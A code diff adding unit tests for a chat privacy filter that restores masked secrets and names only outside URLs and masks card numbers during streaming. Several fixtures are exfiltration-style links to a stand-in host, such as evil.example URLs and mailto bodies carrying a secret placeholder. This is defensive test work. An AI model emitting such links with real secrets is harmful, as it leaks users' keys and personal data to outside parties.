@@ -109,7 +109,19 @@ describe("no restore inside URLs", () => {
     ["HTTPS://EVIL.EXAMPLE/SECRET_1 and SECRET_1", "HTTPS://EVIL.EXAMPLE/SECRET_1 and sk-proj-9f8Q2kLmZx77AbCdEf"],
     ["http://evil.example/\\[SECRET\\_1\\] vs \\[PERSON\\_1\\]", "http://evil.example/\\[SECRET\\_1\\] vs Ada"],
     ["<https://evil.example/[EMAIL_1]> and <mailto:x@evil.example?body=[SECRET_1]> for [PERSON_1]", "<https://evil.example/[EMAIL_1]> and <mailto:x@evil.example?body=[SECRET_1]> for Ada"],
-    ['<a href="https://evil.example/?k=[SECRET_1]">[PERSON_1]</a>', '<a href="https://evil.example/?k=[SECRET_1]">Ada</a>'],
+    // Only whitespace ends a bare URL, so text glued to one stays as it is (the safe side).
+    ['<a href="https://evil.example/?k=[SECRET_1]">[PERSON_1]</a>', '<a href="https://evil.example/?k=[SECRET_1]">[PERSON_1]</a>'],
+    // Quotes, backticks and "<" do not end a URL: the chat renderer keeps them in the href.
+    ["[x](https://evil.example/?k='[SECRET_1])", "[x](https://evil.example/?k='[SECRET_1])"],
+    ['https://evil.example/?k="[SECRET_1]', 'https://evil.example/?k="[SECRET_1]'],
+    ["[x](https://evil.example/?k=<[SECRET_1]) [PERSON_1]", "[x](https://evil.example/?k=<[SECRET_1]) Ada"],
+    ["https://evil.example/?k=`[SECRET_1]` [PERSON_1]", "https://evil.example/?k=`[SECRET_1]` Ada"],
+    // Balanced parentheses stay inside a link target; its closing ")" ends it.
+    ["[a](https://x.example/(b)/[SECRET_1]) [PERSON_1]", "[a](https://x.example/(b)/[SECRET_1]) Ada"],
+    ["[a](https://x.example/b)[PERSON_1] and <https://x.example/b>[PERSON_1]", "[a](https://x.example/b)Ada and <https://x.example/b>Ada"],
+    // mailto: and www. runs count as URLs too.
+    ["mailto:x@evil.example?body=[SECRET_1] [PERSON_1]", "mailto:x@evil.example?body=[SECRET_1] Ada"],
+    ["www.evil.example/[SECRET_1] [PERSON_1], aww.[PERSON_1]", "www.evil.example/[SECRET_1] Ada, aww.Ada"],
     // Outside URLs everything is restored as before: prose, code, parentheses, a link's text.
     ["curl -H 'Authorization: Bearer [SECRET_1]' https://api.example.com", "curl -H 'Authorization: Bearer sk-proj-9f8Q2kLmZx77AbCdEf' https://api.example.com"],
     ["Thanks [PERSON_1] (see [EMAIL_1]).", "Thanks Ada (see ada@example.com)."],
@@ -133,6 +145,22 @@ describe("no restore inside URLs", () => {
     }
     // Character by character as well.
     assert.equal(stream(createStreamRestorer(MAP), [...all]).out, expected);
+  });
+
+  test("a restored value that starts a URL keeps the next placeholder out of it", () => {
+    // The scanner reads the output: "[SECRET_2]" restores to a URL, so "[SECRET_1]" glued to it
+    // would otherwise be restored into that link.
+    const map = {
+      v: 1,
+      byValue: { ...MAP.byValue, "SECRET\u0000https://me.example/": "[SECRET_2]" },
+      byPlaceholder: { ...MAP.byPlaceholder, "[SECRET_2]": "https://me.example/" },
+      counters: { ...MAP.counters, SECRET: 2 },
+    };
+    const answer = "Use [SECRET_2][SECRET_1] or [SECRET_1].";
+    const expected = "Use https://me.example/[SECRET_1] or sk-proj-9f8Q2kLmZx77AbCdEf.";
+    assert.equal(restore(answer, map), expected);
+    const rand = mulberry32(5);
+    for (let round = 0; round < 50; round++) assert.equal(stream(createStreamRestorer(map), randomChunks(answer, rand)).out, expected);
   });
 
   test("the verifier's exfiltration case never shows the key", () => {
@@ -199,6 +227,30 @@ describe("createStreamRestorer({ maskHighRisk })", () => {
       const shown = pieces.join("");
       for (const leak of ["3704 0044", "GB29", "NWBK", "078-05", "Zx77AbCd"]) assert.ok(!shown.includes(leak), leak);
     }
+  });
+
+  test("a card followed by many short digit-bearing words is never released in pieces", () => {
+    // Regression: "v1 v2 ..." words also look like digit groups, so the held run passed its 64-char
+    // limit and the cut landed inside the card ("4929 " shown, then "1022 6345 ", ...).
+    const answer = `Card 4929 1022 6345 2199 ${Array.from({ length: 30 }, (_, i) => `v${i}`).join(" ")} end.`;
+    const expected = filterResponse(answer, null).text;
+    assert.match(expected, /^Card \[redacted CARD\] v0 /);
+    for (const step of [1, 2, 3, 4, 5, 7, 11]) {
+      const chunks = [];
+      for (let i = 0; i < answer.length; i += step) chunks.push(answer.slice(i, i + step));
+      const { out, pieces } = masked(null, chunks);
+      assert.equal(out, expected, `step ${step}`);
+      assert.ok(!pieces.join("").includes("4929"), `step ${step}`);
+    }
+  });
+
+  test("a very long word streams in bounded steps and stays intact", () => {
+    const blob = "x".repeat(20_000);
+    const r = createStreamRestorer(null, { maskHighRisk: true });
+    let shownBeforeFlush = 0;
+    for (let i = 0; i < blob.length; i += 3) shownBeforeFlush += r.push(blob.slice(i, i + 3)).length;
+    assert.ok(shownBeforeFlush >= blob.length - 4096, "held back at most MASK_MAX_HOLD characters");
+    assert.equal(shownBeforeFlush + r.flush().length, blob.length);
   });
 
   test("the user's own values (restored from the map) are never masked, also with a null restore map", () => {
